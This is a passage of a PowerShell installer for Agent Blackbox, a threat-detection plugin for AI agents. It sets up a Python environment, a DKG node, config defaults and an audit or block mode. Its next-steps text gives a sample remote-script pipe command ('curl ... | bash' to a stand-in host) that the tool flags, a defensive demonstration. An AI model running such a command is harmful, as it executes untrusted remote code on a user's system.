    $helper = Join-Path $RepoDir "scripts\blackbox-blazegraph.mjs"
    Write-Step "Clearing the installer-managed Blazegraph namespace for the fresh DKG identity ..."
    try {
        & node $helper reset $DkgCliDir $DkgStoreUrl $script:DkgStoreNamespace *> $null
        if ($LASTEXITCODE -ne 0) { throw "Blazegraph reset exit $LASTEXITCODE" }
    } catch {
        Write-Err2 "Could not clear the stale installer-managed Blackbox namespace."
        return $false
    }
    Write-Ok "Fresh Blackbox store is empty and ready for the new DKG identity"
    return $true
}

function Ensure-BlackboxDkgConfig {
    $writer = @'
import json
import os
import secrets
import shutil
import sys
from pathlib import Path

home = Path(sys.argv[1]).expanduser()
api_port = int(sys.argv[2])
store_backend = sys.argv[3]
store_url = sys.argv[4]
store_managed = sys.argv[5].lower() == "true"
context_graph_id = sys.argv[6]
home.mkdir(parents=True, exist_ok=True)
cfg_path = home / "config.json"
original = None
if cfg_path.exists():
    try:
        original = cfg_path.read_text(encoding="utf-8")
        data = json.loads(original)
    except Exception:
        data = {}
else:
    data = {}
data.setdefault("name", "agent-blackbox")
data["apiPort"] = api_port
data.setdefault("listenPort", 0)
data["nodeRole"] = "edge"
data["networkConfig"] = "mainnet-base"
# Relay reachability (see the .sh installer for the full rationale): DKG builds
# its relay set from `relayPeers`; empty -> network-isolation denies every
# relayed connection and the node holds 0 reservations, so no one can reach it.
MAINNET_BASE_RELAYS = [
    "/ip4/178.104.98.10/tcp/9090/p2p/12D3KooWFWm8sg6dkitmdBd5Uxaqp3CDRL27mFcM7vEHK92Xapyy",
    "/ip4/168.119.127.54/tcp/9090/p2p/12D3KooWMasqzRrim48ZJM64UyTfHufDTmSG3n3jqwsS5phz8m91",
    "/ip4/178.156.237.133/tcp/9090/p2p/12D3KooWDgTunUpkGaE7dYCaDP1CCBT6Dm2HPMXSZhJn2KXYLH15",
    "/ip4/178.105.211.42/tcp/9090/p2p/12D3KooWCodgXHMwybaEe93rbKgWMfGXQvUb6cpT3VCrjCbbnyEu",
]
existing_relays = data.get("relayPeers") if isinstance(data.get("relayPeers"), list) else []
merged_relays = list(dict.fromkeys([*existing_relays, *MAINNET_BASE_RELAYS]))
data["relayPeers"] = merged_relays
data["relayReservationCount"] = int(data.get("relayReservationCount") or 4)
# DKG owns restart-safe continuation of the persisted Blackbox subscription.
# The one-inflight/zero-queue limits below prevent sync fan-out from starving
# Blazegraph while still allowing the reconciler to resume bounded manifests.
data["syncOnConnectEnabled"] = True
data["syncReconcilerEnabled"] = True
data["durableSyncEnabled"] = True
data.pop("syncAgentsMeta", None)
data["syncGlobalMaxInflight"] = 1
data["syncGlobalQueueLimit"] = 0
data.pop("restrictAutoSubscribeContextGraphs", None)
data["syncSharedMemoryOnConnect"] = False
priorities = data.get("syncContextGraphPriorities")
if not isinstance(priorities, dict):
    priorities = {}
priorities.update({context_graph_id: 100, "agents": -100, "ontology": -100})
data["syncContextGraphPriorities"] = priorities
data.setdefault("autoUpdate", {"enabled": False})
data["chain"] = {
    "type": "evm",
    "rpcUrl": "https://mainnet.base.org",
    "rpcUrls": ["https://base-rpc.publicnode.com", "https://base.drpc.org"],
    "hubAddress": "0x99Aa571fD5e681c2D27ee08A7b7989DB02541d13",
    "chainId": "base:8453",
}
auth = data.get("auth") if isinstance(data.get("auth"), dict) else {}
data["auth"] = {**auth, "enabled": True}
store = data.get("store") if isinstance(data.get("store"), dict) else {}
previous_backend = store.get("backend")
switched = bool(previous_backend and previous_backend != store_backend)
if switched and original is not None:
    backup_path = home / f"config.json.pre-{store_backend}"
    if not backup_path.exists():
        shutil.copy2(cfg_path, backup_path)
    (home / ".blackbox-store-reset-pending").write_text(store_backend + "\n", encoding="utf-8")
if store_backend == "blazegraph":
    data["store"] = {
        "backend": "blazegraph",
        "options": {"url": store_url, "managedByDkg": store_managed, "timeout": 900000},
    }
elif store_backend == "oxigraph-server":
    previous_options = store.get("options") if previous_backend == store_backend else None
    data["store"] = {"backend": "oxigraph-server"}
    if isinstance(previous_options, dict) and previous_options:
        data["store"]["options"] = previous_options
else:
    raise SystemExit(f"unsupported store backend: {store_backend}")
rendered = json.dumps(data, indent=2) + "\n"
changed = rendered != original
if changed:
    cfg_path.write_text(rendered, encoding="utf-8")
token_path = home / "auth.token"
if not token_path.exists():
    token_path.write_text(
        "# DKG node API token - treat this like a password\n"
        + secrets.token_urlsafe(32)
        + "\n",
        encoding="utf-8",
    )
    os.chmod(token_path, 0o600)
    changed = True
print("switched" if switched else ("changed" if changed else "unchanged"))
'@
    $writerFile = Join-Path $env:TEMP "blackbox_dkg_config.py"
    Set-Content -Path $writerFile -Value $writer -Encoding UTF8
    try {
        $configState = & $VenvPython $writerFile $DkgHome $DkgPort $script:DkgSelectedStoreBackend $DkgStoreUrl $DkgStoreManagedByDkg $ContextGraphId
        if ($LASTEXITCODE -ne 0) { throw "dkg config exit $LASTEXITCODE" }
        $configResult = $configState | Select-Object -Last 1
        if ($configResult -eq "switched") {
            $script:DkgAcceptStoreReset = $true
            $script:DkgRestartRequired = $true
            Write-Warn2 "Switching DKG storage to $script:DkgSelectedStoreBackend; the previous store will not be deleted."
            Write-Step "Backup config: $DkgHome\config.json.pre-$script:DkgSelectedStoreBackend"
        } elseif ($configResult -eq "changed") {
            $script:DkgRestartRequired = $true
        }
    } finally {
        Remove-Item $writerFile -Force -ErrorAction SilentlyContinue
    }
}

# ── Locate (or fetch) the repo ──────────────────────────────────────────────
function Test-BlackboxRepoCheckout {
    param([string]$Path)
    if (-not (Test-Path "$Path\.git")) { return $false }
    if (-not (Test-Path "$Path\pyproject.toml")) { return $false }
    if (-not (Test-Path "$Path\plugins\blackbox")) { return $false }
    try {
        & git -C $Path rev-parse --verify HEAD *> $null
        return $LASTEXITCODE -eq 0
    } catch {
        return $false
    }
}

function Move-BrokenBlackboxRepoAside {
    param([string]$Path)
    $stamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $backup = "$Path.broken-$stamp-$PID"
    Write-Warn2 "Existing install at $Path is incomplete or not an Agent Blackbox checkout."
    Move-Item -LiteralPath $Path -Destination $backup
    Write-Step "Preserved it at $backup"
}

function Resolve-Repo {
    $scriptDir = Split-Path -Parent $PSCommandPath
    if ($scriptDir) {
        $d = Split-Path -Parent $scriptDir
        if ((Test-Path "$d\pyproject.toml") -and (Test-Path "$d\plugins\blackbox")) {
            $script:RepoDir = $d
            Write-Step "Using existing checkout at $RepoDir"
            return
        }
    }
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Err2 "git is required to download Blackbox. Install git and re-run."
        exit 1
    }
    $script:RepoDir = $DefaultRepoDir
    if ((Test-Path $RepoDir) -and -not (Test-BlackboxRepoCheckout $RepoDir)) {
        Move-BrokenBlackboxRepoAside $RepoDir
    }
    if (Test-BlackboxRepoCheckout $RepoDir) {
        Write-Step "Updating existing clone at $RepoDir"
        & git -C $RepoDir fetch --depth 1 origin $RepoBranch
        if ($LASTEXITCODE -ne 0) { throw "Could not fetch $RepoBranch from $RepoUrl" }
        & git -C $RepoDir checkout $RepoBranch
        if ($LASTEXITCODE -ne 0) { throw "Could not check out $RepoBranch in $RepoDir" }
        & git -C $RepoDir pull --ff-only origin $RepoBranch
        if ($LASTEXITCODE -ne 0) { throw "Could not fast-forward $RepoDir to origin/$RepoBranch" }
    } else {
        Write-Step "Cloning $RepoUrl -> $RepoDir"
        & git clone --depth 1 --branch $RepoBranch $RepoUrl $RepoDir
        if ($LASTEXITCODE -ne 0) { throw "Could not clone $RepoUrl into $RepoDir" }
    }
    if (-not (Test-BlackboxRepoCheckout $RepoDir)) {
        throw "$RepoDir is not a complete Agent Blackbox Python project"
    }
    Write-Ok "Repo ready at $RepoDir"
}

# ── Python venv + editable install ──────────────────────────────────────────
function Install-PythonEnv {
    Write-Heading "Installing Hermes + Blackbox (Python)"
    $script:VenvDir = "$RepoDir\venv"
    $script:VenvPython = "$VenvDir\Scripts\python.exe"
    if (-not (Test-Path $VenvDir)) {
        Write-Step "Creating virtual environment ..."
        & $script:PyExe @($script:PyArgs + @("-m", "venv", $VenvDir))
    } else {
        Write-Step "Reusing existing venv at $VenvDir"
    }
    Write-Step "Upgrading pip and installing Hermes + Agent Blackbox (web extras, editable) ..."
    & $VenvPython -m pip install --upgrade pip | Out-Null
    Push-Location $RepoDir
    try {
        & $VenvPython -m pip install -e ".[web]"
    } finally {
        Pop-Location
    }
    Write-Ok "Blackbox installed (editable, with dashboard extras)"
    $script:HermesBin = "$VenvDir\Scripts\hermes.exe"
}

# ── Global blackbox command (per-user shim) ─────────────────────────────────
function Install-BlackboxCommand {
    $shimDir = Join-Path $HOME ".local\bin"
    $shimPath = Join-Path $shimDir "blackbox.cmd"
    New-Item -ItemType Directory -Force -Path $shimDir | Out-Null

    $managedMarker = "managed-by: agent-blackbox-installer"
    if ((Test-Path $shimPath) -and -not (Select-String -Path $shimPath -SimpleMatch $managedMarker -Quiet)) {
        Write-Warn2 "Not replacing existing command at $shimPath; remove or rename it, then re-run the installer."
        return
    }

    $launcher = @"
@echo off
@rem managed-by: agent-blackbox-installer
"$HermesBin" blackbox %*
exit /b %ERRORLEVEL%
"@
    [IO.File]::WriteAllText($shimPath, $launcher, [Text.Encoding]::ASCII)
    Write-Ok "Installed blackbox -> hermes blackbox ($shimPath)"

    $normalizedShim = $shimDir.TrimEnd('\')
    $userPath = [Environment]::GetEnvironmentVariable("Path", "User")
    $userEntries = @($userPath -split ';' | ForEach-Object { $_.Trim().TrimEnd('\') })
    if ($userEntries -notcontains $normalizedShim) {
        try {
            $newUserPath = if ([string]::IsNullOrWhiteSpace($userPath)) {
                $shimDir
            } else {
                "$shimDir;$userPath"
            }
            [Environment]::SetEnvironmentVariable("Path", $newUserPath, "User")
            Write-Ok "Added $shimDir to the user PATH"
        } catch {
            Write-Warn2 "Could not add $shimDir to the user PATH automatically: $_"
        }
    }
    $processEntries = @($env:Path -split ';' | ForEach-Object { $_.Trim().TrimEnd('\') })
    if ($processEntries -notcontains $normalizedShim) {
        $env:Path = "$shimDir;$env:Path"
    }
}

# ── DKG node CLI + bootstrap ────────────────────────────────────────────────
function Install-BlackboxDkgPackage {
    $backupDir = ""
    $packageJson = Join-Path $DkgCliDir "node_modules\@origintrail-official\dkg\package.json"
    $npmLog = Join-Path $HermesHome "logs\blackbox-npm-install.log"
    $npmCommand = Get-Command npm -ErrorAction SilentlyContinue
    if (-not $npmCommand) {
        Write-Warn2 "npm is required to install the published OriginTrail DKG package."
        return $false
    }

    if (Test-Path (Join-Path $DkgCliDir ".git")) {
        $backupDir = "$DkgCliDir.custom-backup-$(Get-Date -Format yyyyMMddHHmmss)"
        Write-Step "Moving the custom DKG checkout to $backupDir"
        try {
            Move-Item $DkgCliDir $backupDir
        } catch {
            Write-Warn2 "Could not preserve the custom DKG checkout before installing npm DKG: $_"
            return $false
        }
    }

    New-Item -ItemType Directory -Force -Path $DkgCliDir | Out-Null
    New-Item -ItemType Directory -Force -Path (Split-Path -Parent $npmLog) | Out-Null
    try {
        & npm install --prefix $DkgCliDir --prefer-online $DkgPackage 2>&1 | Tee-Object -FilePath $npmLog | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "npm install exit $LASTEXITCODE" }
    } catch {
        if ($backupDir) {
            Remove-Item $DkgCliDir -Recurse -Force -ErrorAction SilentlyContinue
            Move-Item $backupDir $DkgCliDir
        }
        Write-Warn2 "Could not install the published DKG package ${DkgPackage}: $_"
        Write-Step "npm log: $npmLog"
        return $false
    }

    if (-not (Test-Path $DkgBin) -or -not (Test-Path $packageJson)) {
        if ($backupDir) {
            Remove-Item $DkgCliDir -Recurse -Force -ErrorAction SilentlyContinue
            Move-Item $backupDir $DkgCliDir
        }
        Write-Warn2 "npm completed, but the DKG CLI entrypoint is missing at $DkgBin."
        return $false
    }
    $installedVersion = (& node -p "require(process.argv[1]).version" $packageJson 2>$null)
    if (-not $installedVersion) {
        Write-Warn2 "Could not determine the installed DKG package version."
        return $false
    }
    & $script:VenvPython -m plugins.blackbox.dkg_version $installedVersion
    if ($LASTEXITCODE -ne 0) {
        Write-Warn2 "DKG $installedVersion is too old for direct verified Blackbox recovery; version 10.0.9+ is required."
        return $false
    }
    Write-Step "Using published upstream DKG $installedVersion unchanged."
    Write-Ok "Published DKG npm package ready ($installedVersion)"
    return $true
}

function Install-Dkg {
    Write-Heading "Setting up the OriginTrail DKG node"
    if ($SkipDkg) {
        $script:InstallIncomplete = $true
        Write-Warn2 "Skipping DKG node setup (-SkipDkg)."
        Show-DkgManualHint
        return
    }
    if (-not $script:HasNode) {
        $script:InstallIncomplete = $true
        Write-Warn2 "Node.js $NodeMajor+ not available - cannot set up the DKG node or sync the threat graph."
        Show-DkgManualHint
        return
    }
    if (-not (Initialize-BlackboxDkgProcessEnvironment)) {
        $script:InstallIncomplete = $true
        Show-DkgManualHint
        return
    }

    Write-Step "Installing the published OriginTrail DKG package ($DkgPackage) ..."
    Write-Step "  npm prefix: $DkgCliDir"
    if (-not (Install-BlackboxDkgPackage)) {
        $script:InstallIncomplete = $true
        Show-DkgManualHint
        return
    }

    if (-not (Move-LegacyBlackboxDkgHome)) {
        Show-DkgManualHint
        return
    }

    $script:DkgFreshState = -not (Test-BlackboxDkgState)
    New-Item -ItemType Directory -Force -Path $DkgHome | Out-Null
    if (-not (Test-BlackboxDkgPort)) {
        Show-DkgManualHint
        return
    }
    if (-not (Initialize-BlackboxStore)) {
        if ($script:DockerRequired) {
            Write-Err2 "Installation stopped before changing the DKG store. Set up Docker and re-run the installer."
            exit 1
        }
        Write-Err2 "Blazegraph setup did not complete and Oxigraph was not confirmed. Installation stopped."
        exit 1
    }
    if (-not (Reset-FreshManagedBlazegraph)) {
        Write-Err2 "Installation stopped before creating a DKG identity against stale graph state."
        exit 1
    }
    if ($script:DkgAlreadyRunning) {
        Ensure-BlackboxDkgConfig
        if (-not (Prepare-BlackboxDkgRuntimeFingerprint)) {
            Show-DkgManualHint
            return
        }
        if (-not $script:DkgRestartRequired) {
            $script:DkgReady = $true
            return
        }
        Write-Step "Restarting the Blackbox-owned DKG node to activate sync and relay updates ..."
        try {
            Invoke-BlackboxDkg stop
            if ($LASTEXITCODE -ne 0) { throw "dkg stop exit $LASTEXITCODE" }
            Invoke-BlackboxDkg start
            if (-not (Wait-BlackboxDkgRuntime)) { throw "DKG runtime verification failed" }
            Remove-Item $script:DkgStoreResetMarker -Force -ErrorAction SilentlyContinue
            Write-Ok "Blackbox DKG node restarted with the current sync settings"
            if (-not (Save-BlackboxDkgRuntimeFingerprint)) {
                Show-DkgManualHint
                return
            }
            $script:DkgReady = $true
        } catch {
            $script:InstallIncomplete = $true
            Write-Warn2 "Could not restart the Blackbox DKG node; the updated sync settings are not active."
            Show-DkgManualHint
        }
        return
    }
    Ensure-BlackboxDkgConfig
    if (-not (Prepare-BlackboxDkgRuntimeFingerprint)) {
        Show-DkgManualHint
        return
    }

    Write-Step "Bootstrapping a Blackbox-owned $Network node at $DkgDaemonUrl ..."
    Write-Step "  DKG home: $DkgHome"
    Write-Step "  DKG CLI:  $DkgBin"
    Write-Step "  Store:    $(Get-BlackboxStoreDescription)"
    Write-Step "  (non-interactive; subscribing and reading need no wallet funding)"
    try {
        Invoke-BlackboxDkg start
        if (-not (Wait-BlackboxDkgRuntime)) { throw "DKG runtime verification failed" }
        Remove-Item $script:DkgStoreResetMarker -Force -ErrorAction SilentlyContinue
        Write-Ok "DKG node bootstrapped on $Network"
        if (-not (Save-BlackboxDkgRuntimeFingerprint)) {
            Show-DkgManualHint
            return
        }
        $script:DkgReady = $true
    } catch {
        $script:InstallIncomplete = $true
        Write-Warn2 "DKG node bootstrap did not complete. Threat-graph sync is not active yet."
        Show-DkgManualHint
    }
}

# Pull the verified ruleset now so detection is live immediately after install.
function Sync-Ruleset {
    if (-not $script:DkgReady) { return }
    Write-Heading "Syncing the threat ruleset"
    Write-Step "Requesting one controlled verified graph catch-up ..."
    $out = & $script:HermesBin blackbox sync --wait --timeout $CatchupTimeout --require-rules 2>&1
    $code = $LASTEXITCODE
    if ($out) { $out | ForEach-Object { Write-Host $_ } }
    if ($code -eq 0) {
        Write-Ok "Ruleset synced - Blackbox is watching with the latest threats"
    } else {
        $script:InstallIncomplete = $true
        Write-Err2 "Initial verified threat-graph sync did not complete."
        Write-Step "A partial verified ruleset may already be active, but setup is incomplete until the curator snapshot settles."
        Write-Step "Retry the full sync with: blackbox sync --wait --require-rules"
    }
    Write-Ok "DKG native reconciliation enabled; one in-flight slot; zero queue"
}

function Show-DkgManualHint {
    Write-Step "To set up the DKG node later:"
    Write-Host "      node -v  # must be v$NodeMajor or newer"
    Write-Host "      New-Item -ItemType Directory -Force -Path `"$DkgCliDir`""
    Write-Host "      npm install --prefix `"$DkgCliDir`" `"$DkgPackage`""
    Write-Host "      `$env:BLACKBOX_DKG_HOME = `"$DkgHome`""
    Write-Host "      `$env:BLACKBOX_DKG_BIN = `"$DkgBin`""
    Write-Host "      `$env:BLACKBOX_DKG_PORT = `"$DkgPort`""
    if ($script:DkgSelectedStoreBackend -eq "blazegraph") {
        Write-Host "      `$env:BLACKBOX_DKG_STORE_URL = `"$DkgStoreUrl`""
    }
    Write-Host "      `$env:BLACKBOX_DKG_DAEMON_URL = `"$DkgDaemonUrl`""
    Write-Host "      # create config.json/auth.token as in scripts/blackbox-install.ps1, then:"
    Write-Host "      `$env:DKG_HOME = `$env:BLACKBOX_DKG_HOME"
    Write-Host "      `$env:NODE_OPTIONS = `"$($script:DkgNodeOptions)`""
    Write-Host "      `$env:DKG_SYNC_GLOBAL_MAX_INFLIGHT = `"$DkgSyncGlobalMaxInflight`""
    Write-Host "      `$env:DKG_STORE_QUEUE_LIMIT = `"$DkgStoreQueueLimit`""
    Write-Host "      `$env:DKG_LIST_CONTEXT_GRAPHS_PROJECTION = `"$DkgListContextGraphsProjection`""
    Write-Host "      & `$env:BLACKBOX_DKG_BIN start"
    Write-Host "      # then re-run:  blackbox sync --wait --require-rules"
}

# ── Enable plugin + write config defaults (idempotent) ──────────────────────
function Enable-AndConfigure {
    Write-Heading "Enabling and configuring Blackbox"

    Write-Step "Enabling the blackbox plugin without privileged tool overrides ..."
    try {
        & $HermesBin plugins enable blackbox --no-allow-tool-override 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "hermes exit $LASTEXITCODE" }
        Write-Ok "Plugin enabled"
    } catch {
        Write-Warn2 "Could not run 'hermes plugins enable blackbox --no-allow-tool-override' automatically."
        Write-Step "Run it yourself after the install: hermes plugins enable blackbox --no-allow-tool-override"
    }

    Write-Step "Writing plugins.entries.blackbox defaults to $HermesHome\config.yaml ..."
    $configWriter = @'
import sys, os
cfg_path, dkg_url, dkg_home, dkg_bin, context_graph_id, graph_peer_id = sys.argv[1:7]
try:
    import yaml
except Exception:
    print("  (PyYAML unavailable - skipping config update; run 'blackbox status' to configure)")
    sys.exit(0)
os.makedirs(os.path.dirname(cfg_path), exist_ok=True)
data = {}
if os.path.exists(cfg_path):
    with open(cfg_path) as f:
        data = yaml.safe_load(f) or {}
plugins = data.setdefault("plugins", {})
entries = plugins.setdefault("entries", {})
blackbox = entries.setdefault("blackbox", {})
legacy_dkg_urls = {"http://127.0.0.1:9200", "http://localhost:9200"}
legacy_graphs = {"0x37b1Fdfd134e2b17583bCBdD3034F91504cD9C70/agent-blackbox", "umanitek/blackbox-threats-staging", "umanitek/guardian-threats-staging", "umanitek/guardian-threats"}
legacy_peers = {"12D3KooWAuEHYTWbD3R3yPTcECCYZnrjHNpJmrUw5b4D5T3m5Kr3", "12D3KooWBY9jmNATMPv1DZcKbFas5RtjpkhT69pPwvkUBY2MMnDX", "12D3KooWQHQd1SNecrRxwceqPJkXS" + "K" + "EYn8vrV4QyJ2AfqeYwXz1E", "12D3KooWBJskzr2unXQG9mR3LRZFUJoxWr1PN6hTbyWyKndHXjZM"}
default_dkg_home = os.path.abspath(os.path.expanduser("~/.dkg"))
legacy_blackbox_dkg_home = os.path.abspath(os.path.expanduser("~/.hermes/blackbox/dkg"))
legacy_blackbox_dkg_bin = os.path.abspath(os.path.expanduser("~/.hermes/blackbox/dkg-cli/node_modules/.bin/dkg.cmd"))
added = []
current_dkg_url = str(blackbox.get("dkg_url") or blackbox.get("dkgUrl") or "").rstrip("/")
current_dkg_home = str(blackbox.get("dkg_home") or blackbox.get("dkgHome") or "").strip()
current_dkg_home_abs = os.path.abspath(os.path.expanduser(current_dkg_home)) if current_dkg_home else ""
target_dkg_home_abs = os.path.abspath(os.path.expanduser(dkg_home))
uses_shared_dkg_home = current_dkg_home_abs == default_dkg_home
uses_unpaired_shared_dkg_home = uses_shared_dkg_home and (not current_dkg_url or current_dkg_url in legacy_dkg_urls)
uses_legacy_blackbox_dkg_home = current_dkg_home_abs == legacy_blackbox_dkg_home
current_dkg_bin = str(blackbox.get("dkg_bin") or blackbox.get("dkgBin") or "").strip()
current_dkg_bin_abs = os.path.abspath(os.path.expanduser(current_dkg_bin)) if current_dkg_bin else ""
expected_managed_bin = (
    os.path.join(os.path.dirname(current_dkg_home_abs), "dkg", "node_modules", ".bin", "dkg.cmd")
    if current_dkg_home_abs else ""
)
uses_target_managed_home = current_dkg_home_abs == target_dkg_home_abs
uses_other_managed_checkout = bool(
    current_dkg_home_abs
    and os.path.basename(current_dkg_home_abs) == ".dkg"
    and current_dkg_home_abs != target_dkg_home_abs
    and current_dkg_bin_abs == expected_managed_bin
)
stale_configured_dkg_home = bool(current_dkg_home_abs) and not os.path.isdir(current_dkg_home_abs)
stale_configured_dkg_bin = bool(current_dkg_bin_abs) and not os.path.isfile(current_dkg_bin_abs)
rebind_managed_dkg = (
    uses_target_managed_home
    or uses_other_managed_checkout
    or stale_configured_dkg_home
    or stale_configured_dkg_bin
)
current_graph = str(blackbox.get("context_graph_id") or "")
if "dkg_url" not in blackbox or current_dkg_url in legacy_dkg_urls or uses_unpaired_shared_dkg_home or uses_legacy_blackbox_dkg_home or rebind_managed_dkg:
    blackbox["dkg_url"] = dkg_url.rstrip("/")
    added.append("dkg_url")
if "dkg_home" not in blackbox or not blackbox.get("dkg_home") or uses_unpaired_shared_dkg_home or uses_legacy_blackbox_dkg_home or rebind_managed_dkg:
    blackbox["dkg_home"] = dkg_home
    added.append("dkg_home")
if not current_dkg_bin or current_dkg_bin == "dkg" or current_dkg_bin_abs == legacy_blackbox_dkg_bin or rebind_managed_dkg:
    blackbox["dkg_bin"] = dkg_bin
    added.append("dkg_bin")
if current_graph in legacy_graphs:
    blackbox["context_graph_id"] = context_graph_id
    added.append("context_graph_id")
if not blackbox.get("graph_peer_id") or str(blackbox.get("graph_peer_id")) in legacy_peers:
    blackbox["graph_peer_id"] = graph_peer_id
    added.append("graph_peer_id")
defaults = {
    "mode": "audit",
    "context_graph_id": context_graph_id,
    "graph_peer_id": graph_peer_id,
    "sync_interval": 3600,
    # Community sharing has not shipped.  Keep fresh installs private, and
    # make the obsolete outbound-report allowance inert for compatibility
    # with older readers that still expect the key to exist.
    "report": False,
    "daily_report_limit": 0,
    "report_min_severity": "high",
    "block_severity": "critical",
    "dashboard_port": 9700,
    # Optional LLM reviewer — off until `blackbox setup-llm` fills it in.
    "llm": {"enabled": False, "provider": "", "model": "", "api_key": ""},
}
for k, v in defaults.items():
    if k not in blackbox:
        blackbox[k] = v
        added.append(k)
# Migrate stale pre-release sharing settings too. The feature is closed at
# runtime, so leaving an old opt-in in config is misleading even if inert.
for k, v in {"report": False, "daily_report_limit": 0}.items():
    if blackbox.get(k) != v:
        blackbox[k] = v
        added.append(k)
with open(cfg_path, "w") as f:
    yaml.safe_dump(data, f, default_flow_style=False, sort_keys=False)
print("  configured: " + ", ".join(added) if added else "  already configured - no changes")
'@
    $configFile = Join-Path $env:TEMP "blackbox_configure.py"
    Set-Content -Path $configFile -Value $configWriter -Encoding UTF8
    try {
        & $VenvPython $configFile "$HermesHome\config.yaml" $DkgDaemonUrl $DkgHome $DkgBin $ContextGraphId $GraphPeerId
        if ($LASTEXITCODE -ne 0) { throw "config update exit $LASTEXITCODE" }
        Write-Ok "Config defaults written (audit mode - blocking is opt-in)"
    } catch {
        Write-Warn2 "Could not write config automatically. Run 'blackbox status' to verify configuration."
    } finally {
        Remove-Item $configFile -Force -ErrorAction SilentlyContinue
    }
}

function Get-BlackboxMode {
    $reader = @'
import sys, os
cfg_path = sys.argv[1]
try:
    import yaml
except Exception:
    print("audit")
    sys.exit(0)
data = {}
if os.path.exists(cfg_path):
    with open(cfg_path) as f:
        data = yaml.safe_load(f) or {}
mode = data.get("plugins", {}).get("entries", {}).get("blackbox", {}).get("mode", "audit")
mode = str(mode).lower()
print(mode if mode in ("audit", "block") else "audit")
'@
    $readerFile = Join-Path $env:TEMP "blackbox_mode_read.py"
    Set-Content -Path $readerFile -Value $reader -Encoding UTF8
    try {
        $out = (& $VenvPython $readerFile "$HermesHome\config.yaml" 2>$null | Select-Object -Last 1)
        if ($out -eq "block") { return "block" }
        return "audit"
    } finally {
        Remove-Item $readerFile -Force -ErrorAction SilentlyContinue
    }
}

function Set-BlackboxMode {
    param([string]$Mode)
    $writer = @'
import sys, os
cfg_path, mode = sys.argv[1], sys.argv[2]
try:
    import yaml
except Exception:
    print("  (PyYAML unavailable - could not save protection mode)")
    sys.exit(1)
if mode not in ("audit", "block"):
    sys.exit(1)
os.makedirs(os.path.dirname(cfg_path), exist_ok=True)
data = {}
if os.path.exists(cfg_path):
    with open(cfg_path) as f:
        data = yaml.safe_load(f) or {}
blackbox = data.setdefault("plugins", {}).setdefault("entries", {}).setdefault("blackbox", {})
blackbox["mode"] = mode
blackbox.setdefault("block_severity", "critical")
with open(cfg_path, "w") as f:
    yaml.safe_dump(data, f, default_flow_style=False, sort_keys=False)
'@
    $writerFile = Join-Path $env:TEMP "blackbox_mode_write.py"
    Set-Content -Path $writerFile -Value $writer -Encoding UTF8
    try {
        & $VenvPython $writerFile "$HermesHome\config.yaml" $Mode
        return ($LASTEXITCODE -eq 0)
    } finally {
        Remove-Item $writerFile -Force -ErrorAction SilentlyContinue
    }
}

function Configure-BlackboxMode {
    Write-Heading "Choosing Blackbox enforcement mode"
    $current = if ($env:BLACKBOX_MODE) { $env:BLACKBOX_MODE.ToLowerInvariant() } else { "" }
    if (($current -ne "audit") -and ($current -ne "block")) {
        $current = Get-BlackboxMode
    }
    if ($current -ne "block") { $current = "audit" }

    if ([Console]::IsInputRedirected) {
        $script:BlackboxSelectedMode = $current
        Write-Step "Non-interactive install - keeping Blackbox in $current mode."
        return
    }

    Write-Host "  Choose how Blackbox should react when it finds threats."
    Write-Host "    1) Audit - log and report findings, but do not stop actions. [recommended]"
    Write-Host "    2) Block - stop confirmed threats at/above the configured severity."
    $ans = Read-Host "  Protection mode [1/2, Enter keeps $current]"
    switch -Regex ($ans) {
        '^(2|b|block)$' { $script:BlackboxSelectedMode = "block"; break }
        '^(1|a|audit)?$' { $script:BlackboxSelectedMode = $current; break }
        default {
            Write-Warn2 "Unknown protection mode '$ans' - keeping $current."
            $script:BlackboxSelectedMode = $current
        }
    }

    if (Set-BlackboxMode $script:BlackboxSelectedMode) {
        Write-Ok "Blackbox protection mode set to: $script:BlackboxSelectedMode"
    } else {
        Write-Warn2 "Could not save Blackbox protection mode. Set it later in the dashboard or config.yaml."
    }
}

# ── Auto-protect every local agent (best-effort, non-fatal) ─────────────────
# Discovers every local Hermes home + OpenClaw workspace and enables Blackbox
# in each, so protection is on everywhere without per-instance setup.
function Protect-AllAgents {
    Write-Heading "Protecting all local agents"
    Write-Step "Discovering local Hermes homes + OpenClaw workspaces (blackbox attach) ..."
    try {
        & $HermesBin blackbox attach
        if ($LASTEXITCODE -ne 0) { throw "hermes exit $LASTEXITCODE" }
        Write-Ok "Blackbox attached to all discovered local agents"
    } catch {
        Write-Warn2 "Could not auto-attach to every local agent (this is non-fatal)."
        Write-Step "Re-run anytime with:  blackbox attach"
    }
}

# ── Guided next steps (single source of truth) ──────────────────────────────
function Show-NextSteps {
    $docsUrl = $RepoUrl -replace '\.git$',''
    $mode = if ($script:BlackboxSelectedMode) { $script:BlackboxSelectedMode } else { Get-BlackboxMode }
    $storeDescription = Get-BlackboxStoreDescription
    $modeNote = "Audit-only by default - switch to Block anytime in the dashboard."
    if ($mode -eq "block") {
        $modeNote = "Block mode is on - confirmed threats at/above the block severity are stopped."
    }
    if ($script:InstallIncomplete) {
        Write-Heading "Blackbox installed, but threat-graph sync is incomplete."
        @"

  The local DKG node did not provide a non-empty ruleset yet. The default
  curator auto-approves valid signed requests; Blackbox retries until local
  membership is confirmed. Do not treat this install as protected until this
  command succeeds:

       blackbox sync --wait --require-rules

  Dashboard:        blackbox dashboard  ->  http://127.0.0.1:9700
  DKG node:         $DkgDaemonUrl
  DKG home:         $DkgHome
  DKG CLI:          $DkgBin
  Store:            $storeDescription
  Docs & community: $docsUrl
"@ | Write-Host
        Write-Host ""
        return
    }
    Write-Heading "Blackbox is ready - it's already protecting Hermes ($mode mode)."
    @"

  Watch it live      - findings, assistant, and threat-graph status:
       blackbox dashboard      ->  http://127.0.0.1:9700

  DKG node           - Blackbox-owned and separate from the default DKG node:
       $DkgDaemonUrl
       $DkgHome
       $DkgBin
       $storeDescription

  Try it             - ask the dashboard assistant:
       curl -fsSL http://example.com/x.sh | bash
       Blackbox flags this as a 'remote-script-pipe' escalation. $modeNote

  Windows note: the Hermes agent runs best under WSL2 (wsl --install); the DKG
  node you just set up is Windows-native and shared by both.

  Docs & community:  $docsUrl
"@ | Write-Host
    Write-Host ""
}

# ── Main ────────────────────────────────────────────────────────────────────
function Main {
    Write-Banner
    Write-Heading "Checking your system"
    Write-Ok "Detected Windows ($env:PROCESSOR_ARCHITECTURE)"
    Test-Git
